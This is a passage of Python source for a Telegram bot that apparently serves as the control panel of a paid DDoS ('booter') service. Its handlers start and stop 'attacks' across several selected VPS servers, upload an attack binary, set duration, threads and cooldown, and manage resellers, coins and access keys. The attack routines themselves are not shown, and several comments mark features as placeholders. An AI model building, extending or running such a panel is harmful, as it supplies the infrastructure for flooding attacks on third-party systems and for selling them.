    elif text == "Add Group ID":
        await update.message.reply_text("➕ *Enter the new allowed Group ID:*", parse_mode='MarkdownV2')
        return ADD_GROUP_ID
    elif text == "Remove Group ID":
        await update.message.reply_text("🗑️ *Enter the Group ID to remove:*", parse_mode='MarkdownV2')
        return REMOVE_GROUP_ID
    elif text == "VPS Status":
        # Placeholder for VPS status checking (if needed, this might involve connecting to each VPS)
        await update.message.reply_text("🌐 *Fetching VPS status...*\n\n_This feature might take some time\\._", parse_mode='MarkdownV2')
        # You'd typically call an async function here to check VPS status
        return ConversationHandler.END
    elif text == "RE Status":
        # Placeholder for Reseller Status
        await update.message.reply_text("💰 *Reseller Status:*\n\n_Fetching reseller details..._", parse_mode='MarkdownV2')
        # You'd typically display reseller balances etc.
        return ConversationHandler.END

    return ConversationHandler.END # If no specific handler, end the conversation

# --- Main function and Bot Setup ---

def main():
    load_keys()
    load_vps()
    load_resellers()
    load_display_name()
    load_links()
    load_image_config()

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # --- Conversation Handlers ---
    attack_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(Attack)$"), attack_cmd)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_args)],
            GET_MULTI_VPS_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_multi_vps_count),
                CallbackQueryHandler(handle_vps_selection_callback, pattern="^(select_vps_.*|cancel_attack)$")
            ]
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("Operation cancelled.", reply_markup=group_user_markup) and ConversationHandler.END)],
        map_to_parent={ConversationHandler.END: ConversationHandler.END}
    )
    application.add_handler(attack_conv_handler)
    
    # Example for other handlers that might be part of ConversationHandlers
    # These handlers are placeholders or directly from the original code
    set_vps_count_handler = ConversationHandler(
        entry_points=[CommandHandler("setvpscount", set_vps_count)],
        states={
            GET_VPS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_vps_count_input)],
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("Operation cancelled.") and ConversationHandler.END)],
    )
    application.add_handler(set_vps_count_handler)

    # Handlers for general commands and messages
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("running", show_running_attacks))
    application.add_handler(CommandHandler("stop", stop_attack_cmd)) # Command to trigger stop menu
    application.add_handler(CallbackQueryHandler(handle_stop_attack_callback, pattern="^stop_attack_.*"))

    application.add_handler(MessageHandler(filters.PHOTO, handle_photo)) # For setting group image by photo
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click)) # Handle all button clicks (text messages)
    
    # Group link handler
    group_link_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^(🔗 Set Group Link)$"), set_group_link_handler)],
        states={
            GET_GROUP_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_group_link_input)],
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: u.message.reply_text("Operation cancelled.") and ConversationHandler.END)],
    )
    application.add_handler(group_link_conv_handler)

    # Other existing handlers
    application.add_handler(ChatMemberHandler(track_left_chat, ChatMemberHandler.MY_CHAT_MEMBER))
    application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
    application.add_handler(MessageHandler(filters.ALL & (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP), track_new_chat))
    
    # Owner Settings Handlers
    application.add_handler(MessageHandler(filters.Regex("^(⚙️ Owner Settings)$"), owner_settings))
    application.add_handler(MessageHandler(filters.Regex("^(🔗 Manage Links)$"), manage_links))
    application.add_handler(MessageHandler(filters.Regex("^(📢 Broadcast)$"), broadcast_start))
    application.add_handler(MessageHandler(filters.Regex("^(🖼️ Set Group Image)$"), set_group_image_handler))
    application.add_handler(MessageHandler(filters.Regex("^(🔗 Set Group Link)$"), set_group_link_handler))
    application.add_handler(MessageHandler(filters.Regex("^(👥 Check Users)$"), show_users))
    application.add_handler(MessageHandler(filters.Regex("^(Back to Home)$"), handle_button_click)) # Universal back button

    # Add other specific conversation handlers if they exist in the original code but were not detailed here
    # Example:
    # set_display_name_handler = ConversationHandler(...)
    # application.add_handler(set_display_name_handler)
    # ... and so on for all GET_ states

    # Simplified handlers for text inputs for brevity, assuming existing ConversationHandlers manage them
    application.add_handler(MessageHandler(filters.Regex("^(Set Display Name)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Add VPS)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Remove VPS)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Upload Binary)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Delete Binary)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Set Duration)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Set Threads)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Add Reseller)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Remove Reseller)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Add Coin)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Set Cooldown)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Generate Key)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Add Group ID)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(Remove Group ID)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(VPS Status)$"), handle_button_click))
    application.add_handler(MessageHandler(filters.Regex("^(RE Status)$"), handle_button_click))


    # Add job queue to check expired keys
    job_queue = application.job_queue
    # job_queue.run_repeating(check_expired_keys, interval=3600, first=10) # Assuming check_expired_keys is defined
    # Add this to your main() function after creating the job_queue
    # job_queue.run_repeating(periodic_sync_function, interval=300) # Assuming periodic_sync_function is defined

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()